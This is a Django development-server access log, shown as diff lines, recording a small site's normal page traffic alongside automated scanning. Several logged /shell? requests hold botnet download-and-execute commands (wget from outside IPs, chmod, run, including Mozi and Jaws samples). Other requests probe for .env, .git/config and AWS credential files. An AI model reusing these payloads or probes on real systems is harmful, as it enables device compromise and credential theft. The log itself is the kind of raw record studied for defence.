+[29/Mar/2023 16:55:56] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 16:55:56] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 16:55:57] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 16:55:57] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 16:55:57] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 16:55:57] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 16:56:03] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 16:56:03] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 16:56:04] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 16:56:04] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 16:56:04] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 16:56:05] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 16:56:05] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 16:57:06] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 16:57:06] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 16:57:06] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 16:57:07] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[29/Mar/2023 16:57:07] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 16:57:07] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 16:57:07] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 16:57:07] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[29/Mar/2023 16:57:08] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 16:57:08] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 16:57:08] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 16:57:09] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 17:15:22] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 17:15:23] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 17:19:15,958] - Broken pipe from ('198.41.242.208', 32712)
+
+[29/Mar/2023 17:25:37] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[29/Mar/2023 17:25:40] code 400, message Bad request version ('À\x13À')
+[29/Mar/2023 17:25:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 17:40:52] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 17:40:53] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 17:47:00] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[29/Mar/2023 18:11:48] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 18:16:06] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1')
+[29/Mar/2023 18:16:06] "GET /shell?cd+/tmp;+wget+http:/\/98.159.98.243/AkitaXss/bin.arm;+chmod+777+bin.arm;+./bin.arm Jaws.Selfrep;rm+-rf+bin.arm HTTP/1.1" 400 -
+[29/Mar/2023 18:34:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[29/Mar/2023 18:34:55] "  /*à     Cookie: mstshash=Administr" 400 -
+[29/Mar/2023 18:36:19] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[29/Mar/2023 18:36:19] "  /*à     Cookie: mstshash=Administr" 400 -
+[29/Mar/2023 18:37:17] "GET /druid/index.html HTTP/1.1" 301 0
+[29/Mar/2023 19:08:35] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 19:27:03] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 19:27:03] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 19:27:03] "GET / HTTP/1.1" 400 64519
+Bad Request: /
+[29/Mar/2023 19:27:03] "GET / HTTP/1.1" 400 64798
+[29/Mar/2023 19:27:03] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 19:27:04] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 19:27:07] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 19:27:07] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 19:53:50] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 20:01:23] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 20:01:24] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 20:01:24] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 20:03:15] "GET /robots.txt HTTP/1.1" 302 0
+[29/Mar/2023 20:03:15] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[29/Mar/2023 20:09:33] code 400, message Bad request syntax ('\x00\x0e8A}º\x93\x19ïET\x00\x00\x00\x00\x00')
+[29/Mar/2023 20:09:33] " 8A}ºïET     " 400 -
+[29/Mar/2023 20:10:22] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[29/Mar/2023 20:21:41] "GET /robots.txt HTTP/1.1" 400 64907
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 20:21:42] "GET / HTTP/1.1" 400 64787
+[29/Mar/2023 21:04:01] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 21:16:28] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[29/Mar/2023 21:20:51] "GET /api/index.php/v1/config/application?public=true HTTP/1.1" 301 0
+[29/Mar/2023 22:08:37] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 22:08:38] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 22:08:39] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 22:45:55] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 22:49:36] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 22:59:01] "GET /.env HTTP/1.1" 301 0
+[29/Mar/2023 22:59:02] "POST / HTTP/1.1" 301 0
+[29/Mar/2023 23:05:39] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 23:06:41] "GET /.git/config HTTP/1.1" 301 0
+[29/Mar/2023 23:10:08] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 23:24:19] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 00:02:38] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 00:32:00] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 00:43:51] "GET / HTTP/1.1" 400 64562
+[30/Mar/2023 00:47:29] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 00:47:30] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 00:55:53] "GET /.env HTTP/1.1" 301 0
+[30/Mar/2023 00:55:53] "POST / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'localhost:8080'. You may need to add 'localhost' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 00:57:56] "GET / HTTP/1.0" 400 63200
+[30/Mar/2023 01:33:57] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 01:33:58] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 01:42:26] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 01:47:31] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 01:47:31] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 01:47:38] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[30/Mar/2023 01:47:38] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[30/Mar/2023 01:47:38] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[30/Mar/2023 01:47:38] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[30/Mar/2023 01:47:38] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[30/Mar/2023 01:47:38] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[30/Mar/2023 01:47:39] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[30/Mar/2023 01:47:39] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[30/Mar/2023 01:47:39] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[30/Mar/2023 01:49:34] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.81.243.34/jaws;sh+/tmp/jaws HTTP/1.1" 400 64092
+[30/Mar/2023 01:49:36] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 01:53:26] "GET /.git/config HTTP/1.1" 301 0
+[30/Mar/2023 01:53:27] "GET /application/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:28] "POST /application/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:33] "GET /enviroments/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:34] "POST /enviroments/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:38] "GET /apps/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:39] "POST /apps/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:41] "GET /back/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:42] "POST /back/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:44] "GET /live_env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:45] "POST /live_env HTTP/1.1" 301 0
+[30/Mar/2023 01:53:47] "GET /.env.production HTTP/1.1" 301 0
+[30/Mar/2023 01:53:47] "POST /.env.production HTTP/1.1" 301 0
+[30/Mar/2023 01:53:50] "GET /.env.prod HTTP/1.1" 301 0
+[30/Mar/2023 01:53:50] "POST /.env.prod HTTP/1.1" 301 0
+[30/Mar/2023 01:54:01] "GET /private/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:02] "POST /private/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:11] "GET /app/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:11] "POST /app/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:14] "GET /.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:14] "POST /.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:23] "GET /.env.development HTTP/1.1" 301 0
+[30/Mar/2023 01:54:23] "POST /.env.development HTTP/1.1" 301 0
+[30/Mar/2023 01:54:25] "GET /cms/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:25] "POST /cms/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:32] "GET /development/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:33] "POST /development/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:38] "GET /sources/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:38] "POST /sources/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:40] "GET /.env.old HTTP/1.1" 301 0
+[30/Mar/2023 01:54:41] "POST /.env.old HTTP/1.1" 301 0
+[30/Mar/2023 01:54:49] "GET /system/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:49] "POST /system/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:52] "GET /script/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:54:52] "POST /script/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:02] "GET /laravel/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:02] "POST /laravel/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:09] "GET /api/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:09] "POST /api/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:12] "GET /shared/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:12] "POST /shared/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:31] "GET /.env.save HTTP/1.1" 301 0
+[30/Mar/2023 01:55:31] "POST /.env.save HTTP/1.1" 301 0
+[30/Mar/2023 01:55:36] "GET /core/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:36] "POST /core/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:38] "GET /enviroments/.env.production HTTP/1.1" 301 0
+[30/Mar/2023 01:55:39] "POST /enviroments/.env.production HTTP/1.1" 301 0
+[30/Mar/2023 01:55:47] "GET /local/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:48] "POST /local/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:54] "GET /rest/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:54] "POST /rest/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:56] "GET /cp/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:55:57] "POST /cp/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:01] "GET /admin-app/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:01] "POST /admin-app/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:03] "GET /docker/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:04] "POST /docker/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:10] "GET /fedex/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:11] "POST /fedex/.env HTTP/1.1" 301 0
+[30/Mar/2023 01:56:16] "GET /.env.dist HTTP/1.1" 301 0
+[30/Mar/2023 01:56:16] "POST /.env.dist HTTP/1.1" 301 0
+[30/Mar/2023 01:56:18] "GET /.env.project HTTP/1.1" 301 0
+[30/Mar/2023 01:56:18] "POST /.env.project HTTP/1.1" 301 0
+[30/Mar/2023 01:56:20] "GET /frontend_dev.php/$ HTTP/1.1" 301 0
+[30/Mar/2023 01:56:23] "GET /debug/default/view?panel=config HTTP/1.1" 301 0
+[30/Mar/2023 01:56:25] "GET /config.json HTTP/1.1" 301 0
+[30/Mar/2023 01:56:27] "GET /.json HTTP/1.1" 301 0
+[30/Mar/2023 01:56:32] "GET /?phpinfo=1 HTTP/1.1" 301 0
+[30/Mar/2023 01:56:35] "GET /_profiler/phpinfo HTTP/1.1" 301 0
+[30/Mar/2023 01:56:35] "GET /phpinfo.php HTTP/1.1" 301 0
+[30/Mar/2023 01:56:46] "GET /info.php HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 02:14:31] "GET / HTTP/1.1" 400 64560
+[30/Mar/2023 02:32:31] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 02:50:46] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 03:07:28] "GET /.env HTTP/1.1" 301 0
+[30/Mar/2023 03:07:31] "POST / HTTP/1.1" 301 0
+[30/Mar/2023 03:17:06] "GET /auth.asp HTTP/1.1" 301 0
+[30/Mar/2023 03:23:19] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 03:25:36] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 03:25:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 03:25:36] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$7Bí®_\x15\x8a\x88Îhþ\x14\x16ìá¯\x97MJ\x90±D\x1bÈ¿gÙ\x93ÈÑ¦\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[30/Mar/2023 03:25:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 03:25:37] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 03:25:37] "GET /client/get_targets HTTP/1.1" 301 0
+[30/Mar/2023 03:25:37] "GET /upl.php HTTP/1.1" 301 0
+[30/Mar/2023 03:25:37] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ðºßè\x0f5Õ\x07\x11\x8c\x9cí\x8f\x89È\x19\x00Fæ\x89¼¡Iv_$*\x0ekZ6\x92\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[30/Mar/2023 03:25:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 03:25:37] "GET /geoip/ HTTP/1.1" 301 0
+[30/Mar/2023 03:25:38] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 03:25:38] "GET /favicon.ico HTTP/1.1" 301 0
+[30/Mar/2023 03:34:48] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 0
+[30/Mar/2023 03:38:08] "GET /.env HTTP/1.1" 302 0
+Forbidden (Referer checking failed - no Referer.): /
+[30/Mar/2023 03:38:08] "POST / HTTP/1.1" 403 3372
+[30/Mar/2023 03:56:45] "GET /robots.txt HTTP/1.1" 301 0
+[30/Mar/2023 03:56:45] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 03:56:45] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[30/Mar/2023 03:56:46] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[30/Mar/2023 03:56:46] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[30/Mar/2023 03:56:46] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[30/Mar/2023 03:56:47] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[30/Mar/2023 03:56:47] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[30/Mar/2023 03:56:47] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[30/Mar/2023 03:56:50] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 03:57:16] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 03:57:17] "GET /dashboard HTTP/1.1" 200 13242
+[30/Mar/2023 03:57:18] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[30/Mar/2023 03:57:18] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[30/Mar/2023 03:57:19] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 200 76084
+[30/Mar/2023 03:57:30] "GET /static/assets/css/argon.css.map HTTP/1.1" 200 1117809
+[30/Mar/2023 04:06:59] "GET /dashboard HTTP/1.1" 200 13248
+[30/Mar/2023 04:07:02] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 04:07:18] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:07:20] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:07:26] "GET /static/assets/img/theme/user.png HTTP/1.1" 200 24784
+[30/Mar/2023 04:07:27] "GET /dashboard HTTP/1.1" 200 13248
+[30/Mar/2023 04:07:46] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:08:02] "GET /dashboard HTTP/1.1" 200 13248
+[30/Mar/2023 04:08:05] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:08:09] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:08:14] "GET /dashboard HTTP/1.1" 200 13248
+[30/Mar/2023 04:09:28] "GET /.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:28] "GET /.env HTTP/1.1" 302 0
+[30/Mar/2023 04:09:28] "GET /login/?next=/.env HTTP/1.1" 200 5163
+Forbidden (Referer checking failed - no Referer.): /
+[30/Mar/2023 04:09:29] "POST / HTTP/1.1" 403 3372
+[30/Mar/2023 04:09:29] "POST / HTTP/1.1" 301 0
+[30/Mar/2023 04:09:29] "GET /config/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:29] "GET /web/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:29] "GET /app/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /laravel/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /crm/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /backend/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /local/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /application/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:30] "GET /admin/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /prod/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /api/.env HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:09:31] "GET /phpinfo HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /_profiler/phpinfo HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /phpinfo.php HTTP/1.1" 301 0
+[30/Mar/2023 04:09:31] "GET /info.php HTTP/1.1" 301 0
+[30/Mar/2023 04:09:32] "GET /aws.yml HTTP/1.1" 301 0
+[30/Mar/2023 04:09:32] "GET /config/aws.yml HTTP/1.1" 301 0
+[30/Mar/2023 04:09:32] "GET /config.js HTTP/1.1" 301 0
+[30/Mar/2023 04:09:32] "GET /.aws/credentials HTTP/1.1" 301 0
+[30/Mar/2023 04:09:32] "GET /php.ini HTTP/1.1" 301 0
+[30/Mar/2023 04:09:45] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:09:59] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:11:39] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:11:41] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:12:01] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:14:56] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:15:29] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:15:45] "GET /robots.txt HTTP/1.1" 301 0
+[30/Mar/2023 04:15:45] "GET /robots.txt HTTP/1.1" 302 0
+[30/Mar/2023 04:15:45] "GET /login/?next=%2Frobots.txt HTTP/1.1" 200 5163
+[30/Mar/2023 04:16:03] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:17:19] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:18:26] "GET /sitemap.xml HTTP/1.1" 301 0
+[30/Mar/2023 04:18:26] "GET /sitemap.xml HTTP/1.1" 302 0
+[30/Mar/2023 04:18:26] "GET /login/?next=%2Fsitemap.xml HTTP/1.1" 200 5163
+[30/Mar/2023 04:18:27] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 04:26:21] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 04:26:24] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 04:26:26] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 04:26:39] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 04:26:40] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:26:57] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:28:01] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:30:38] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:30:55] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 04:35:09] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 04:35:13] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 04:35:46] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 04:35:47] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:37:59] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 04:40:13] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 04:41:54] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 04:42:17] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 04:42:48] "GET /favicon.ico HTTP/1.1" 301 0
+[30/Mar/2023 04:44:25] "GET /geoserver/web/ HTTP/1.1" 301 0
+[30/Mar/2023 05:34:08] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 05:50:55] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 05:50:57] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 05:51:23] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 05:51:23] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 05:56:37] code 400, message Bad request syntax ('MGLNDD_5.161.208.197_80')
+[30/Mar/2023 05:56:37] "MGLNDD_5.161.208.197_80" 400 -
+[30/Mar/2023 05:56:42] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 06:50:21] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 06:55:46] "GET /robots.txt HTTP/1.1" 302 0
+[30/Mar/2023 06:58:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[30/Mar/2023 06:58:14] "  /*à     Cookie: mstshash=Administr" 400 -
+[30/Mar/2023 06:59:35] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 06:59:35] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 304 0
+[30/Mar/2023 06:59:35] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 304 0
+[30/Mar/2023 06:59:36] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 304 0
+[30/Mar/2023 06:59:36] "GET /static/str-logo.png HTTP/1.1" 304 0
+[30/Mar/2023 06:59:43] "GET /login/ HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[30/Mar/2023 07:13:03] "GET /robots.txt HTTP/1.1" 400 64837
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
